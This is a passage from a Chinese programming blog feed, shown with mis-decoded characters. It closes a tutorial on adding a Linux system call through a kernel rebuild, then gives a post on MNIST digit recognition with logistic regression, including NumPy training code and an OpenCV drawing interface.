<h2 id="å°†å†…æ ¸å®‰è£…è¿›ç³»ç»Ÿä¸­"><a href="#å°†å†…æ ¸å®‰è£…è¿›ç³»ç»Ÿä¸­" class="headerlink" title="å°†å†…æ ¸å®‰è£…è¿›ç³»ç»Ÿä¸­"></a>å°†å†…æ ¸å®‰è£…è¿›ç³»ç»Ÿä¸­</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h2 id="é‡å¯å¹¶æµ‹è¯•"><a href="#é‡å¯å¹¶æµ‹è¯•" class="headerlink" title="é‡å¯å¹¶æµ‹è¯•"></a>é‡å¯å¹¶æµ‹è¯•</h2><p>é‡å¯è¿‡ç¨‹è¿›å…¥é«˜çº§é€‰é¡¹</p>
<p>åˆšåˆšé‡å¯çš„æ—¶å€™æŒ‰ä¸‹<code>ESC</code>ï¼ˆç½‘ä¸Šè¯´æ˜¯<code>ESC</code>ï¼Œä½†æ˜¯æˆ‘çš„æ˜¯é•¿æŒ‰<code>Shift</code>ï¼‰</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588383413241.png" class>

<p>é€‰æ‹©é«˜çº§é€‰é¡¹ï¼Œç„¶åé€‰æ‹©æ–°å†…æ ¸</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588383460106.png" class>

<p>å‡å¦‚è¿›å…¥å†…æ ¸çš„è¿‡ç¨‹å‡ºç°<code>kernel panic not syncing:System is deadlocked on memory</code>é”™è¯¯ï¼Œåªéœ€è¦å°†å†…å­˜å¢å¤§å³å¯ã€‚</p>
<p>æ–°å»ºæµ‹è¯•æºç¨‹åº<code>testMyCall.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// syscall éœ€è¦ä¼ é€’ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ç¼–å·</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> myRetutn = syscall(<span class="number">548</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"syscall return: %ld"</span>,myRetutn);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘è¿è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc testMyCall.c -o test</span><br><span class="line">./test</span><br><span class="line">syscall return: 1</span><br></pre></td></tr></table></figure>

<p><strong>æˆ‘ä»¬å‘ç°å¹¶æ²¡æœ‰è¾“å‡º<code>hello syscall!</code></strong>,æ˜¯å› ä¸ºæ—¥å¿—è¾“å‡ºçº§åˆ«é—®é¢˜ï¼Œåªéœ€è¦è°ƒç”¨<code>dmesg</code>å‘½ä»¤å³å¯ã€‚</p>
]]></content>
      <categories>
        <category>Linuxç›¸å…³</category>
      </categories>
      <tags>
        <tag>å‘½ä»¤è¡Œ</tag>
        <tag>æ•™ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>é€»è¾‘å›å½’-æ‰‹å†™å­—ç¬¦è¯†åˆ«</title>
    <url>/2022/04/25/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-%E6%89%8B%E5%86%99%E5%AD%97%E7%AC%A6%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é€»è¾‘å›å½’è™½ç„¶åœ¨åå­—é‡Œè¾¹å¸¦äº†é€»è¾‘ï¼Œä½†æ˜¯ç»å¸¸è¢«ç”¨äºåˆ†ç±»é—®é¢˜ï¼Œè€Œä¸”å¸¸å’Œçº¿æ€§å›å½’ç›¸ç»“åˆï¼Œæœ¬æ–‡å°†åˆ©ç”¨<code>MNIST</code>æ•°æ®é›†ï¼Œå®Œæˆå¤šåˆ†ç±»é—®é¢˜ï¼Œå¸¦ä½ ä¸€çª¥é€»è¾‘å›å½’èƒŒåçš„åŸç†ã€‚</p>
<a id="more"></a>

<h2 id="ç›¸å…³åŸç†"><a href="#ç›¸å…³åŸç†" class="headerlink" title="ç›¸å…³åŸç†"></a>ç›¸å…³åŸç†</h2><h3 id="æ•°æ®é›†è·å–"><a href="#æ•°æ®é›†è·å–" class="headerlink" title="æ•°æ®é›†è·å–"></a>æ•°æ®é›†è·å–</h3><p><a href="http://yann.lecun.com/exdb/mnist/" target="_blank" rel="noopener">ä¸‹è½½åœ°å€</a></p>
<p>è¯¥æ•°æ®é›†ä¸­åŒ…å«äº†6ä¸‡ä¸ªè®­ç»ƒé›†æ ·æœ¬ã€1ä¸‡ä¸ªæµ‹è¯•é›†æ ·æœ¬ï¼Œæ¯ä¸ªæ ·æœ¬éƒ½æ˜¯<code>28*28</code>çš„å­—ç¬¦å›¾ç‰‡ï¼Œæ ‡ç­¾ä¸ºè¯¥å­—ç¬¦å¯¹åº”çš„å­—ç¬¦ç±»åˆ«ï¼Œä¸‹å›¾ä¸ºæŸä¸€ä¸ªæ ·æœ¬ï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425125449.png" alt></p>
<p>è·å–æ•°æ®é›†ä»¥åï¼Œæˆ‘ä»¬è¿˜è¦å°†å›¾ç‰‡é™ç»´ï¼Œä½¿ä¹‹å˜ä¸ºé•¿åº¦<code>784</code>çš„å‘é‡ï¼Œæ„å‘³ç€æˆ‘ä»¬æœ‰<code>784</code>ä¸ªç‰¹å¾ï¼Œè™½ç„¶æå–ç‰¹å¾æœ‰æ›´å¥½çš„æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œä»ç„¶ä½¿ç”¨çº¿æ€§å›å½’çš„æ–¹æ³•ã€‚</p>
<p>æ­¤å¤–ï¼Œæ¯ä»½æ ·æœ¬çš„æ ‡ç­¾å€¼æ˜¯è¯¥æ ·æœ¬çš„ç±»åˆ«ï¼Œè¿˜åº”è¯¥è¿›è¡Œ<a href="https://baike.baidu.com/item/%E7%8B%AC%E7%83%AD%E7%BC%96%E7%A0%81/9717350?fr=aladdin" target="_blank" rel="noopener">ç‹¬çƒ­ç¼–ç </a>ï¼Œå°†å…¶è½¬ä¸ºæ¯ä¸ªç±»åˆ«çš„æ¦‚ç‡ã€‚</p>
<h3 id="sigmoidå‡½æ•°"><a href="#sigmoidå‡½æ•°" class="headerlink" title="sigmoidå‡½æ•°"></a>sigmoidå‡½æ•°</h3><p>è¯¥å‡½æ•°ä¹Ÿç§°ä¸ºé€»è¾‘å‡½æ•°ï¼Œå‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p>  <img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425125914.png" alt="g(z)=\frac{1}{1+e^{-z}} "></p>
<p>å‡½æ•°å¤§æ¦‚é•¿è¿™æ ·ï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425130418.png" alt="g(z)=\frac{1}{1+e^{-z}} "></p>
<p>å®ƒå¾ˆç¬¦åˆæˆ‘ä»¬çš„ç›´è§‚æ„Ÿè§‰ï¼Œåœ¨æ— ç©·å¤§æˆ–è€…æ— ç©·å°çš„æ—¶å€™ï¼Œå˜åŒ–ä¸å¤§ï¼Œè¦ä¹ˆè¶‹äº1è¦ä¹ˆè¶‹äº0ï¼Œè€Œåœ¨ä¸­é—´ä½ç½®å˜åŒ–æœ€ä¸ºæ˜æ˜¾ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ±‚å¾—å…¶å¯¼æ•°ï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425130720.png" alt="g&#39;(z)=g(z)(1-g(z))"></p>
<h3 id="Forward-propagationï¼ˆå‰å‘ä¼ æ’­-ï¼‰"><a href="#Forward-propagationï¼ˆå‰å‘ä¼ æ’­-ï¼‰" class="headerlink" title="Forward propagationï¼ˆå‰å‘ä¼ æ’­ ï¼‰"></a>Forward propagationï¼ˆå‰å‘ä¼ æ’­ ï¼‰</h3><p>è¯¥è¿‡ç¨‹æ˜¯ä»è¾“å…¥åˆ°è¾“å‡ºçš„è¿‡ç¨‹ï¼Œå³ä»å›¾ç‰‡è¾“å…¥åˆ°è®¡ç®—å…¶æ¯ä¸€ä¸ªç±»åˆ«æ¦‚ç‡çš„è¿‡ç¨‹ï¼Œå¦‚æœæ˜¯äºŒåˆ†ç±»é—®é¢˜ï¼Œé‚£ä¹ˆè¾“å‡ºåˆ™æ˜¯è¯¥å›¾ç‰‡å±äºè¯¥ç±»åˆ«çš„æ¦‚ç‡ï¼Œè‹¥æ˜¯å¤šåˆ†ç±»ï¼Œé‚£ä¹ˆè¾“å‡ºçš„ä¸ªæ•°åº”è¯¥ä¸ç±»åˆ«æ•°é‡ä¸€è‡´ï¼Œå…¶æ¯ä¸€ä¸ªè¾“å‡ºå¯¹åº”ç±»åˆ«çš„æ¦‚ç‡ã€‚</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425131534.png" alt="\widehat{y}_{i}=g(z)=g\left(\mathrm{w}^{T} x+b\right)=\frac{1}{1+e^{-\mathrm{w}^{T} x-b}}"></p>
<blockquote>
<p>è¿™é‡Œçš„ <code>w</code>å°±æ˜¯æˆ‘ä»¬å›¾ç‰‡æ¯ä¸€ä¸ªåƒç´ å¯¹åº”çš„æƒé‡ï¼Œæ•…é•¿åº¦ä¹Ÿä¸º784</p>
</blockquote>
<h3 id="Back-propagation-ï¼ˆåå‘ä¼ æ’­ï¼‰"><a href="#Back-propagation-ï¼ˆåå‘ä¼ æ’­ï¼‰" class="headerlink" title="Back propagation ï¼ˆåå‘ä¼ æ’­ï¼‰"></a>Back propagation ï¼ˆåå‘ä¼ æ’­ï¼‰</h3><p>åå‘ä¼ æ’­æŒ‡çš„æ˜¯ä»æ ¹æ®è¾“å‡ºï¼Œè®¡ç®—æ¢¯åº¦ï¼Œæ›´æ–°å‚æ•°çš„è¿‡ç¨‹ï¼Œè¿™é‡Œä½¿ç”¨çš„ä»ç„¶æ˜¯æ¢¯åº¦ä¸‹é™åˆ†ææ³•ã€‚ä¸è¿‡æˆ‘ä»¬å…ˆä»‹ç»ä¸€ä¸‹äº¤å‰ç†µçš„æ¦‚å¿µï¼Œè¿™ä¸ªä¸€èˆ¬ç”¨äºè¡¡é‡ä¸¤ä¸ªæ¦‚ç‡åˆ†å¸ƒçš„è·ç¦»ï¼Œä¹Ÿå¯ä»¥è¯´ç”¨æ¥åˆ¤æ–­ä¸¤ä¸ªæ¨¡å‹ä¹‹é—´æœ‰å¤šâ€œåƒâ€ï¼Œè¯¥å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425133102.png" alt></p>
<p>æˆ‘ä»¬ä¹Ÿæ˜¯ç”¨è¯¥å‡½æ•°ä½œä¸ºæˆ‘ä»¬çš„æŸå¤±å‡½æ•°ã€‚</p>
<p>è¯¥å‡½æ•°å¯¹<code>z</code>æ±‚å¯¼ä¸ºï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425135143.png" alt="\frac{\mathrm{d}L}{\mathrm{d}z}=\frac{-y_i}{g\left(z\right)}g\left(z\right)\left(1-g\left(z\right)\right)+\frac{1-y_i}{1-g\left(z\right)}g\left(z\right)\left(1-g\left(z\right)\right)=g\left(z\right)-y_i"></p>
<p>è¿›ä¸€æ­¥åœ°ï¼Œå¯¹å‚æ•°<code>w</code>æ±‚å¯¼</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425135445.png" alt="\frac{\partial L}{\partial w}=\frac{\mathrm{d} L}{\mathrm{d}z}\frac{\partial z}{\partial w}=\frac{\mathrm{d} L}{\mathrm{d}z}x=\left(g\left(z\right)-y\right)x"></p>
<p>åŒç†ï¼Œå¯¹<code>b</code>æ±‚å¯¼</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425135716.png" alt="\frac{\partial L}{\partial b}=\frac{\mathrm{d} L}{\mathrm{d}z}\frac{\partial z}{\partial b}=\frac{\mathrm{d} L}{\mathrm{d}z}=g\left(z\right)-y"></p>
<h3 id="softmax-å‡½æ•°"><a href="#softmax-å‡½æ•°" class="headerlink" title="softmax å‡½æ•°"></a>softmax å‡½æ•°</h3><p>ç”±äºæˆ‘ä»¬çš„è¾“å‡ºæœ‰å¤šä¸ªï¼Œå…·ä½“æ¥è¯´ï¼Œè¾“å‡ºä¸ªæ•°<code>k</code>ç­‰äºç±»åˆ«æ•°ï¼Œæœ¬æ•°æ®é›†è€Œè¨€ï¼Œæœ‰<code>10</code>ä¸ªï¼Œè¿™æ ·å°±åŠ¿å¿…å¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼Œæ‰€æœ‰çš„æ¦‚ç‡åŠ èµ·æ¥å’Œå¯èƒ½ä¸ä¸º<code>1</code>ï¼Œè¿™æ˜¾ç„¶è¿èƒŒå¸¸ç†ï¼Œå› æ­¤è¦è¿›ä¸€æ­¥å¤„ç†è¾“å‡ºï¼Œæˆ‘ä»¬ä½¿ç”¨<code>softmax</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425140306.png" alt="softmax\left(o_j\right)=softmax\left(g\left(z_j\right)\right)=\frac{e^{o_j}}{\sum_{i=0}^{k}e^{o_i}}"></p>
<h2 id="è®­ç»ƒä»£ç "><a href="#è®­ç»ƒä»£ç " class="headerlink" title="è®­ç»ƒä»£ç "></a>è®­ç»ƒä»£ç </h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogicTrain</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_tain</span><span class="params">(self, epoch, learning_rate)</span>:</span></span><br><span class="line">        </span><br><span class="line">        fig = plt.figure()</span><br><span class="line">        cost_ax = fig.add_subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">        cost_ax.set_title(<span class="string">"Loss change process"</span>)</span><br><span class="line">        accuracy_ax = fig.add_subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        accuracy_ax.set_title(<span class="string">"accuracy"</span>)</span><br><span class="line"></span><br><span class="line">        training_inputs, training_labels, validation_inputs, validation_labels, test_inputs, test_labels = self.load_binary_data()</span><br><span class="line">        <span class="comment"># feature_num æ˜¯ 784ï¼Œå³æ¯ä¸€å¼ å›¾ç‰‡æ‹‰æˆä¸€ç»´çš„å‘é‡çš„é•¿åº¦</span></span><br><span class="line">        n, feature_num = training_inputs.shape</span><br><span class="line">        k = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        accuracy_x, accuracy_y = [], []</span><br><span class="line">        w, b = self.init_parameter(feature_num, k)</span><br><span class="line"></span><br><span class="line">        cost_x, cost_y = [], []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(epoch):</span><br><span class="line">            y_hat = self.forward(training_inputs, w, b)</span><br><span class="line">            w, b = self.backward(training_inputs, w, b, training_labels, y_hat, learning_rate)</span><br><span class="line">            crs_etr = self.cross_entropy(training_labels, y_hat)</span><br><span class="line">            loss = np.sum(crs_etr) / n / k</span><br><span class="line">            print(<span class="string">' epoch = '</span>, i, <span class="string">' loss = '</span>, loss)</span><br><span class="line">            cost_x.append(i)</span><br><span class="line">            cost_y.append(loss)</span><br><span class="line">        <span class="comment"># è®¡ç®—é¢„æµ‹éªŒè¯é›†çš„å‡†ç¡®æ€§</span></span><br><span class="line">        vl_hat = self.forward(validation_inputs, w, b)</span><br><span class="line">        vl_predict = self.softmax(vl_hat)</span><br><span class="line">        <span class="comment"># æ‰¾å‡ºæ¦‚ç‡æœ€å¤§çš„ä¸‹æ ‡ï¼Œå³æœ€å¯èƒ½çš„å­—ç¬¦</span></span><br><span class="line">        predict_label = np.argmax(vl_predict, axis=<span class="number">1</span>)</span><br><span class="line">        predict_right_number = np.sum((predict_label == validation_labels).astype(np.int))</span><br><span class="line">        m = validation_labels.shape[<span class="number">0</span>]</span><br><span class="line">        accuracy = predict_right_number / m</span><br><span class="line">        print(<span class="string">'The accuracy rate is:'</span>, accuracy)</span><br><span class="line">        cost_ax.plot(cost_x, cost_y)</span><br><span class="line">        accuracy_x.append(<span class="string">'lr='</span> + str(learning_rate) + <span class="string">'&amp;epoch='</span> + str(epoch))</span><br><span class="line">        accuracy_y.append(accuracy)</span><br><span class="line">        </span><br><span class="line">        self.save_model(w, b)</span><br><span class="line">        accuracy_ax.bar(accuracy_x, accuracy_y)</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_binary_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># è¯¥æ•°æ®é›†å·²ç»å°†å›¾ç‰‡è½¬ä¸ºè¡Œå‘é‡  å³æ¯ä¸€å¼ å›¾ç‰‡éƒ½è¢«æ‹‰æˆä¸€ç»´å‘é‡äº†</span></span><br><span class="line">        f = gzip.open(<span class="string">'mnist.pkl.gz'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        training_data, validation_data, test_data = pickle.load(f, encoding=<span class="string">'bytes'</span>)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">        training_inputs, training_labels = training_data</span><br><span class="line">        validation_inputs, validation_labels = validation_data</span><br><span class="line">        test_inputs, test_labels = test_data</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å®é™…ä¸Šå­—ç¬¦è¯†åˆ«ï¼Œæ¨¡å‹å¯èƒ½æ›´å…³å¿ƒè¯¥ç‚¹åƒç´ æ˜¯ä¸æ˜¯å±äºå­—ç¬¦ä¸­çš„ä¸€éƒ¨åˆ†</span></span><br><span class="line">        <span class="comment"># å› æ­¤å¯ä»¥å°†åƒç´ äºŒå€¼åŒ–ï¼Œå°†ç°åº¦å€¼ä¿¡æ¯å»æ‰ï¼Œç›´æ¥ 0 æˆ–è€… 1</span></span><br><span class="line">        training_inputs[training_inputs &lt; <span class="number">0.01</span>] = <span class="number">0</span></span><br><span class="line">        training_inputs[training_inputs &gt;= <span class="number">0.01</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        validation_inputs[validation_inputs &lt; <span class="number">0.01</span>] = <span class="number">0</span></span><br><span class="line">        validation_inputs[validation_inputs &gt;= <span class="number">0.01</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        test_inputs[test_inputs &lt; <span class="number">0.01</span>] = <span class="number">0</span></span><br><span class="line">        test_inputs[test_inputs &gt;= <span class="number">0.01</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 10 åˆ†ç±»é—®é¢˜</span></span><br><span class="line">        k = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        training_labels = self.one_hot_encoding(k, training_labels)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (training_inputs, training_labels, validation_inputs, validation_labels, test_inputs, test_labels)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">one_hot_encoding</span><span class="params">(self, k, original_label)</span>:</span></span><br><span class="line">        label = np.eye(k)[original_label].reshape(<span class="number">-1</span>, k)</span><br><span class="line">        <span class="keyword">return</span> label</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_parameter</span><span class="params">(self, n, k)</span>:</span></span><br><span class="line">        w, b = np.random.randn(n, k), np.random.randn(<span class="number">1</span>, k)</span><br><span class="line">        <span class="keyword">return</span> w, b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x, w, b)</span>:</span></span><br><span class="line">        z = np.dot(x, w) + b</span><br><span class="line">        <span class="keyword">return</span> self.sigmoid(z)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span><span class="params">(self, X)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span> / (<span class="number">1.0</span> + np.exp(-X))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backward</span><span class="params">(self, x, w, b, y, y_hat, l_rate)</span>:</span></span><br><span class="line">        m = x.shape[<span class="number">0</span>]</span><br><span class="line">        dw = <span class="number">1.0</span> / m * np.dot(x.T, y_hat - y)</span><br><span class="line">        db = <span class="number">1.0</span> / m * np.sum(y_hat - y)</span><br><span class="line">        w = w - l_rate * dw</span><br><span class="line">        b = b - l_rate * db</span><br><span class="line">        <span class="keyword">return</span> w, b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cross_entropy</span><span class="params">(self, y, y_hat)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> -(y * np.log(y_hat + <span class="number">1e-10</span>) + (<span class="number">1</span> - y) * np.log(<span class="number">1</span> - y_hat + <span class="number">1e-10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">softmax</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x_exp = np.exp(x)</span><br><span class="line">        partition = np.sum(x_exp, axis=<span class="number">1</span>).reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x_exp / partition</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_model</span><span class="params">(self, w, b)</span>:</span></span><br><span class="line">        model = np.vstack((w, b))</span><br><span class="line">        np.save(<span class="string">'params-binarization.npy'</span>, model)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    l = LogicTrain()</span><br><span class="line">    l.start_tain(<span class="number">500</span>, <span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<p>è®­ç»ƒç»“æœï¼š</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425143942.png" alt></p>
<h2 id="åº”ç”¨æ¨¡å‹"><a href="#åº”ç”¨æ¨¡å‹" class="headerlink" title="åº”ç”¨æ¨¡å‹"></a>åº”ç”¨æ¨¡å‹</h2><p>è®­ç»ƒç»“æŸä»¥åï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¾—åˆ°çš„å‚æ•°<code>w</code>å’Œ<code>b</code>ä¿å­˜ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥æµ‹è¯•æˆ‘ä»¬æ¨¡å‹çš„æ€§èƒ½äº†ï¼Œä½¿ç”¨ä¹‹å‰å…ˆå°†å‚æ•°å¯¼å…¥ï¼Œç„¶åå†ä½¿ç”¨ï¼Œè¿™é‡Œå€ŸåŠ©<code>OpenCV</code>å’Œ<code>PyQt</code>ï¼Œä¸»è¦æ˜¯è·å–é¼ æ ‡çš„è½¨è¿¹ï¼Œç„¶åè½¬ä¸ºå›¾ç‰‡ï¼Œå¹¶æ”¾åˆ°æˆ‘ä»¬çš„æ¨¡å‹ä¸­è®¡ç®—æ¯ä¸€ä¸ªç±»åˆ«çš„æ¦‚ç‡ï¼Œå†é€‰æ‹©æœ€å¤§çš„ä½œä¸ºè¾“å‡ºå³å¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QMessageBox</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogicApplication</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># åˆå§‹åŒ–å…¨å±€å‚æ•°</span></span><br><span class="line">        self.drawing = <span class="literal">False</span></span><br><span class="line">        self.ix, self.iy = <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">        self.image = np.zeros((<span class="number">512</span>, <span class="number">512</span>, <span class="number">3</span>), np.uint8)</span><br><span class="line"></span><br><span class="line">        window = cv2.namedWindow(<span class="string">'write your number'</span>)</span><br><span class="line">        cv2.setMouseCallback(<span class="string">'write your number'</span>, self.draw_circle)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¤§å°æ˜¯ 785 * 10</span></span><br><span class="line">        param = self.load_model()</span><br><span class="line"></span><br><span class="line">        w, b = param[<span class="number">0</span>:<span class="number">784</span>, :], param[<span class="number">-1</span>, :]</span><br><span class="line"></span><br><span class="line">        ENTER, SPACE, ESC = <span class="number">13</span>, <span class="number">32</span>, <span class="number">27</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            cv2.imshow(<span class="string">'write your number'</span>, self.image)</span><br><span class="line">            k = cv2.waitKey(<span class="number">50</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">            <span class="comment"># æŒ‰ä¸‹ enter é”®ï¼Œè¯†åˆ«å½“å‰ç”»å¸ƒä¸Šçš„æ•°å­—</span></span><br><span class="line">            <span class="keyword">if</span> k == ENTER:</span><br><span class="line">                print(<span class="string">'enter'</span>)</span><br><span class="line"></span><br><span class="line">                img_new = cv2.cvtColor(self.image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">                cv2.imwrite(<span class="string">"write.jpg"</span>, self.image)</span><br><span class="line">                x = self.handle_img(self.image)</span><br><span class="line">                predict_y = self.softmax(np.dot(x.reshape(<span class="number">1</span>, <span class="number">-1</span>), w) + b)</span><br><span class="line">                <span class="comment"># æ‰¾å‡ºæ¦‚ç‡æœ€å¤§çš„ä¸‹æ ‡ï¼Œå³æœ€å¯èƒ½çš„å­—ç¬¦</span></span><br><span class="line">                predict_label = np.argmax(predict_y, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                self.show_message(predict_label, predict_y)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">'you wirte : '</span>, predict_label)</span><br><span class="line">                print(<span class="string">'Each probability is '</span>.join(str(i) <span class="keyword">for</span> i <span class="keyword">in</span> np.round(predict_y, <span class="number">2</span>)))</span><br><span class="line">            <span class="comment"># æŒ‰ä¸‹ space é”®ï¼Œæ¸…ç©ºå½“å‰å›¾åƒï¼Œè¿˜åŸæˆé»‘è‰²ç”»å¸ƒ</span></span><br><span class="line">            <span class="keyword">elif</span> k == SPACE:</span><br><span class="line">                self.image = np.zeros((<span class="number">512</span>, <span class="number">512</span>, <span class="number">3</span>), np.uint8)  <span class="comment"># æ¸…ç©º</span></span><br><span class="line">            <span class="comment"># æŒ‰ä¸‹ â€œESCâ€ é”®ï¼Œé€€å‡ºç¨‹åº</span></span><br><span class="line">            <span class="keyword">elif</span> k == ESC:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        cv2.destroyWindow(<span class="string">'write your number'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_model</span><span class="params">(self)</span>:</span></span><br><span class="line">        param = np.load(<span class="string">'params-binarization.npy'</span>)</span><br><span class="line">        <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_img</span><span class="params">(self, img)</span>:</span></span><br><span class="line">        <span class="comment"># å°†å›¾åƒç­‰æ¯”ä¾‹ç¼©å°è‡³28x28å¤§å°</span></span><br><span class="line">        img = cv2.resize(img, (<span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line">        <span class="comment"># è½¬åŒ–ä¸ºç°åº¦å›¾</span></span><br><span class="line">        im_arr = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">        <span class="comment"># æŠŠå›¾åƒçŸ©é˜µè½¬åŒ–ä¸ºä¸€ç»´å‘é‡</span></span><br><span class="line">        x = im_arr.reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        x[x &lt; <span 